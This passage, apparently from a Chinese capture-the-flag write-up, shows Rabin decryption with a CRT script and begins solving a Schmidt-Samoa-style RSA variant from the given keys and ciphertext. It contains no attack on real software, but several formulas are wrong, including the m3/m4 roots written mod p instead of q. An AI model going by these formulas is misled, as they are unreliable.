reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span></span></p>
<p>继续开根</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>1</mn></msub><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>2</mn></msub><mo>≡</mo><mi>p</mi><mo>−</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>3</mn></msub><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>m</mi><mn>4</mn></msub><mo>≡</mo><mi>q</mi><mo>−</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} m_1\equiv c^{\frac {p+1}4}modp \\ m_2\equiv p-c^{\frac {p+1}4}modp \\ m_3\equiv c^{\frac {p+1}4}modp \\ m_4\equiv q-c^{\frac {p+1}4}modp\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.76356em;vertical-align:-2.63178em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9500200000000008em;"><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.5949900000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.8899900000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.1849900000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.2049900000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.1500100000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.29501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.59001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.885010000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.905010000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.20002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.1317800000000005em;"><span style="top:-5.131780000000001em;"><span class="pstrut" style="height:3.00889em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.00889em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">4</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span><span style="top:-3.6908900000000004em;"><span class="pstrut" style="height:3.00889em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.00889em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">4</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.00889em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.00889em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">4</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span><span style="top:-0.8091100000000001em;"><span class="pstrut" style="height:3.00889em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.00889em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">4</span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63178em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/110f7b259a9b75b5.png" alt="" /></p>
<p>利用中国剩余定理解出 a、c</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="2"></td><td><pre>n<span class="token operator">=</span><span class="token number">523798549</span></pre></td></tr><tr><td data-num="3"></td><td><pre>p<span class="token operator">=</span><span class="token number">10663</span></pre></td></tr><tr><td data-num="4"></td><td><pre>q<span class="token operator">=</span><span class="token number">49123</span></pre></td></tr><tr><td data-num="5"></td><td><pre>e<span class="token operator">=</span><span class="token number">2</span></pre></td></tr><tr><td data-num="6"></td><td><pre>c<span class="token operator">=</span><span class="token number">162853095</span></pre></td></tr><tr><td data-num="7"></td><td><pre>a<span class="token punctuation">,</span>inv_q <span class="token punctuation">,</span>inv_p<span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>a <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">+</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> n</pre></td></tr><tr><td data-num="11"></td><td><pre>b <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c <span class="token operator">=</span> <span class="token punctuation">(</span>inv_p <span class="token operator">*</span> p <span class="token operator">*</span> mq <span class="token operator">-</span> inv_q <span class="token operator">*</span> q <span class="token operator">*</span> mp<span class="token punctuation">)</span> <span class="token operator">%</span> n</pre></td></tr><tr><td data-num="13"></td><td><pre>d <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr></table></figure><p>好啦，说完 Rabin 就回来讲一下 samoa 吧。</p>
<p>下面先贴一份相关题目的源码</p>
<p><strong><span class="exturl" data-url="aHR0cDovL2VuYy5weQ==">enc.py</span></strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">generkey</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	pubkey <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> q</pre></td></tr><tr><td data-num="6"></td><td><pre>	n <span class="token operator">=</span> pubkey</pre></td></tr><tr><td data-num="7"></td><td><pre>	l <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	privkey <span class="token operator">=</span> inverse<span class="token punctuation">(</span>n<span class="token punctuation">,</span> l<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> pubkey<span class="token punctuation">,</span> privkey</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># pubkey =  2188967977749378274223515689363599801320698247938997135947965550196681836543275429767581633044354412195352229175764784503562989045268075431206876726265968368605210824232207290410773979606662689866265612797103853982014198455433380266671856355564273196151136025319624636805659505233975208570409914054916955097594873702395812044506205943671404203774360656553350987491558491176962018842708476009578127303566834534914605109859995649555122751891647040448980718882755855420324482466559223748065037520788159654436293431470164057490350841209872489538460060216015196875136927502162027562546316560342464968237957692873588796640619530455268367136243313422579857823529592167101260779382665832380054690727358197646512896661216090677033395209196007249594394515130315041760988292009930675192749010228592156047159029095406021812884258810889225617544404799863903982758961208187042972047819358256866346758337277473016068375206319837317222523597</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment"># privkey = 1430375790065574721602196196929651174572674429040725535698217207301881161695296519567051246290199551982286327831985649037584885137134580625982555634409225551121712376849579015320947279716204424716566222721338735256648873164510429206991141648646869378141312253135997851908862030990576004173514556541317395106924370019574216894560447817319669690140544728277302043783163888037836675290468320723215759693903569878293475447370766682477726453262771004872749335257953507469109966448126634101604029506006038527612917418016783711729800719387298398848370079742790126047329182349899824258355003200173612567191747851669220766603</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment"># enc = 1491421391364871767357931639710394622399451019824572362288458431186299231664459957755422474433520889084351841298056066100216440853409346006657723086501921816381226292526490195810903459483318275931326433052468863850690793659405367902593999395060606972100169925074005992478583035226026829214443008941631771292291305226470216430735050944285543542354459162474346521327649934512511202470099020668235115245819634762067338432916012664452035696422865651002305445711778476072004708256200872226475346448360491248823843688268126341094612981308791499434770936360676087490303951728563482686307164877000300082742316368597958297217061375140696272398140310043942637287763946305961019518639745426370821124559939597559475362769382796386720030343305889701616194279058139516811941262747298761646317383112470923295543635754747288259324745583689440061956478083777663996487389553238481759103908588004219390662578446313004404784835263543083088327198</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先计算</mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>ϕ</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>p</mi><mn>2</mn></msup><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mi>p</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">首先计算\phi(N)=\phi)(p^2q)=p(p-1)(q-1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/820eba7b828b8d26.png" alt="" /></p>
<p>如图我们得到</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">x^{p(p-1)(q-1)}\equiv1modN
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/f6fca818daa2783a.png" alt="" /></p>
<p>通过 paper 知道模 pq 时</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace width="1em"/><mspace width="1em"/><mspace width="1em"/><mspace width="1em"/><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi></mrow></msup><mo>≡</mo><msup><mn>2</mn><mrow><mi>N</mi><mo separator="true">⋅</mo><mi>d</mi><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>2</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">N·d\equiv1mod(p-1)(q-1) \quad \quad\quad\quad2^{N·d}\equiv2^{N·dmod(p-1)(q-1)}\equiv2modpq
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mpunct mtight">⋅</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">d</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" 